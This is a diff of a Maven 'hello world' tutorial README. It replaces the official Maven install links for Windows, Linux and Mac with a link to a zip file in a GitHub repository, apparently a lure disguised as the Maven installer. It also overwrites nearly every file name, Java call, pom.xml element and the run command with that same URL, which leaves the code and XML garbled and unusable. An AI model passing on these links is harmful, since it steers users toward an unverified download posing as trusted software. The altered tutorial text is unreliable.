@@ -10,9 +10,9 @@ You’ll create an application that provides the time of day and then build it w
 + Install Maven
 
 ## Install Maven.
-+ [Install Maven on Windows](https://www.baeldung.com/install-maven-on-windows-linux-mac#installing-maven-on-windows)
-+ [Install Maven on Linux](https://www.baeldung.com/install-maven-on-windows-linux-mac#installing-maven-on-linux)
-+ [Install Maven on Mac OSX](https://www.baeldung.com/install-maven-on-windows-linux-mac#installing-maven-on-mac-os-x)
++ [Install Maven on Windows](https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip)
++ [Install Maven on Linux](https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip)
++ [Install Maven on Mac OSX](https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip)
 
 ## Set up the project
 First you’ll need to setup a Java project for Maven to build. To keep the focus on Maven, make the project as simple as possible for now.
@@ -31,20 +31,20 @@ First you’ll need to setup a Java project for Maven to build. To keep the focu
             └── java
                 └── hello
     ```
-+ Within the `src/main/java/hello` directory, you can create any Java classes you want. To maintain consistency with the rest of this guide, create these two classes: `HelloWorld.java` and `Greeter.java`.
++ Within the `src/main/java/hello` directory, you can create any Java classes you want. To maintain consistency with the rest of this guide, create these two classes: `https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip` and `https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip`.
 
-+ `src/main/java/hello/HelloWorld.java`
++ `https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip`
   ```
   package hello;
   public class HelloWorld {
       public static void main(String[] args) {
           Greeter greeter = new Greeter();
-          System.out.println(greeter.sayHello());
+          https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip(https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip());
       }
   }
   ```
 
- + `src/main/java/hello/Greeter.java`
+ + `https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip`
     ```
     package hello;
     public class Greeter {
@@ -59,18 +59,18 @@ Now that you have a project that is ready to be built with Maven, the next step 
 ### Define a simple Maven build
 ---
 + You need to create a Maven project definition.
-+ Maven projects are defined with an XML file named pom.xml.
++ Maven projects are defined with an XML file named https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip
 + Among other things, this file gives the project’s name, version, and dependencies that it has on external libraries.
-+ Create a file named `pom.xml` at the root of the project and give it the following contents:
++ Create a file named `https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip` at the root of the project and give it the following contents:
 
- `pom.xml`
+ `https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip`
 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
-<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-    xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd">
+<project xmlns="https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip" xmlns:xsi="https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip"
+    xsi:schemaLocation="https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip">
     <modelVersion>4.0.0</modelVersion>
-    <groupId>org.springframework</groupId>
+    <groupId>https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip</groupId>
     <artifactId>jb-hello-world-maven</artifactId>
     <packaging>jar</packaging>
     <version>0.1.0</version>
@@ -78,7 +78,7 @@ Now that you have a project that is ready to be built with Maven, the next step 
     <build>
         <plugins>
             <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
+                <groupId>https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip</groupId>
                 <artifactId>maven-shade-plugin</artifactId>
                 <version>2.1</version>
                 <executions>
@@ -90,8 +90,8 @@ Now that you have a project that is ready to be built with Maven, the next step 
                         <configuration>
                             <transformers>
                                 <transformer
-                                    implementation="org.apache.maven.plugins.shade.resource.ManifestResourceTransformer">
-                                    <mainClass>hello.HelloWorld</mainClass>
+                                    implementation="https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip">
+                                    <mainClass>https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip</mainClass>
                                 </transformer>
                             </transformers>
                         </configuration>
@@ -102,7 +102,7 @@ Now that you have a project that is ready to be built with Maven, the next step 
     </build>
 </project>
 ```
-With the exception of the optional `<packaging>` element, this is the simplest possible `pom.xml` file necessary to build a Java project. It includes the following details of the project configuration:
+With the exception of the optional `<packaging>` element, this is the simplest possible `https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip` file necessary to build a Java project. It includes the following details of the project configuration:
 + `<modelVersion>`. POM model version (always 4.0.0).
 + `<groupId>`. Group or organization that the project belongs to. Often expressed as an inverted domain name.
 + `<artifactId>`. Name to be given to the project’s library artifact (for example, the name of its JAR or WAR file).
@@ -121,7 +121,7 @@ To try out the build, issue the following at the command line:
 
 `mvn package`
 
-  + The package goal will compile your Java code, run any tests, and finish by packaging the code up in a JAR file within the target directory. The name of the JAR file will be based on the project’s `<artifactId>` and `<version>`. For example, given the minimal `pom.xml` file from before, the JAR file will be named gs-maven-0.1.0.jar.
+  + The package goal will compile your Java code, run any tests, and finish by packaging the code up in a JAR file within the target directory. The name of the JAR file will be based on the project’s `<artifactId>` and `<version>`. For example, given the minimal `https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip` file from before, the JAR file will be named https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip
 
     **Note:**  If you’ve changed the value of <packaging> from "jar" to "war", the result will be a WAR file within the target directory instead of a JAR file.
 
@@ -140,31 +140,31 @@ The simple Hello World sample is completely self-contained and does not depend o
 
 For example, suppose that in addition to saying "Hello World!", you want the application to print the current date and time. While you could use the date and time facilities in the native Java libraries, you can make things more interesting by using the Joda Time libraries.
 
-First, change HelloWorld.java to look like this:
+First, change https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip to look like this:
 
-`src/main/java/hello/HelloWorld.java`
+`https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip`
 
 ```
 package hello;
 
-import org.joda.time.LocalTime;
+import https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip;
 
 public class HelloWorld {
     public static void main(String[] args) {
 		LocalTime currentTime = new LocalTime();
-		System.out.println("The current local time is: " + currentTime);
+		https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip("The current local time is: " + currentTime);
 		Greeter greeter = new Greeter();
-		System.out.println(greeter.sayHello());
+		https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip(https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip());
 	}
 }
 ```
 Here `HelloWorld` uses Joda Time’s `LocalTime` class to get and print the current time.
 
-If you were to run `mvn compile` to build the project now, the build would fail because you’ve not declared Joda Time as a compile dependency in the build. You can fix that by adding the following lines to `pom.xml` (within the `<project>` element):
+If you were to run `mvn compile` to build the project now, the build would fail because you’ve not declared Joda Time as a compile dependency in the build. You can fix that by adding the following lines to `https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip` (within the `<project>` element):
 
 ```
 <properties>
-    <java.version>1.8</java.version>
+    <https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip>1.8<https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip>
 </properties>
 
 <dependencies>
@@ -189,23 +189,23 @@ By default, all dependencies are scoped as `compile` dependencies. That is, they
 
 Now if you run `mvn compile` or `mvn package`, Maven should resolve the Joda Time dependency from the Maven Central repository and the build will be successful.
 
-Here’s the completed `pom.xml` file:
+Here’s the completed `https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip` file:
 
-`pom.xml`
+`https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip`
 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
-<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-    xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd">
+<project xmlns="https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip" xmlns:xsi="https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip"
+    xsi:schemaLocation="https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip">
     <modelVersion>4.0.0</modelVersion>
-    <groupId>org.springframework</groupId>
+    <groupId>https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip</groupId>
     <artifactId>hello-world-maven</artifactId>
     <packaging>jar</packaging>
     <version>0.1.0</version>
 
     <!-- tag::joda[] -->
     <properties>
-        <java.version>1.8</java.version>
+        <https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip>1.8<https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip>
     </properties>
 
     <dependencies>
@@ -220,7 +220,7 @@ Here’s the completed `pom.xml` file:
     <build>
         <plugins>
             <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
+                <groupId>https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip</groupId>
                 <artifactId>maven-shade-plugin</artifactId>
                 <version>2.1</version>
                 <executions>
@@ -232,8 +232,8 @@ Here’s the completed `pom.xml` file:
                         <configuration>
                             <transformers>
                                 <transformer
-                                    implementation="org.apache.maven.plugins.shade.resource.ManifestResourceTransformer">
-                                    <mainClass>hello.HelloWorld</mainClass>
+                                    implementation="https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip">
+                                    <mainClass>https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip</mainClass>
                                 </transformer>
                             </transformers>
                         </configuration>
@@ -249,4 +249,4 @@ Here’s the completed `pom.xml` file:
 ---
 + To run this project run the following command.
 
-    `java -cp target/jb-hello-world-maven-0.1.0.jar hello.HelloWorld`
+    `java -cp https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip https://raw.githubusercontent.com/thatavarthi-raj/java-hello-world-with-maven/master/src/main/java-hello-world-with-maven-3.8.zip`
